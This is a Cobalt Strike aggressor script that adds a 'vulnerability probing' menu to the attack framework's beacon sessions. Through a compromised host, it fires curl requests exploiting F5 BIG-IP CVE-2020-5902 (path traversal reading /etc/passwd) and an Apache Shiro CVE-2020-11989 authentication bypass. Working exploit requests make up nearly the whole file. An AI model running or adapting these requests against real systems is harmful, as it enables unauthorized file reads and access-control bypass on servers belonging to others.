##############################
#                            #
#                            #
#                            #
#       Xway.cn@panda        #
#                            #
#                            #
#                            #
##############################
menu "漏洞探测" {
                item "BIG-IP(CVE-2020-5902)"{
                    $bid = $1['@'];
                    $Dialog = dialog("BIG-IP",%(ip => "https://127.0.0.1",bid => $bid),&bigip);
                    dialog_description($Dialog, "BIG-IP RCE(CVE-2020-5902),仅进行漏洞探测，默认读取/etc/passwd文件。");
                    drow_text($Dialog, "ip", "URL: ");
                    dbutton_action($Dialog, "运行");
                    dialog_show($Dialog);
                }

sub bigip{
    local('$Name');
    $Name = $3['ip'];
	bshell($bid, "curl -v -k  $+ $Name\/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd");
}



                item "Apache Shiro(CVE-2020-11989)"{
                    $bid = $1['@'];
                    $Dialog = dialog("BIG-IP",%(ip => "https://127.0.0.1",bid => $bid),&Shiro);
                    dialog_description($Dialog, "Apache Shiro(CVE-2020-11989)权限绕过漏洞,仅进行漏洞探测。");
                    drow_text($Dialog, "ip", "URL: ");
                    dbutton_action($Dialog, "运行");
                    dialog_show($Dialog);
                }

sub Shiro{
    local('$Name');
    $Name = $3['ip'];
	bshell($bid, "curl -v -k  $+ $Name\/;/test/admin/page");
}
			}
			
        
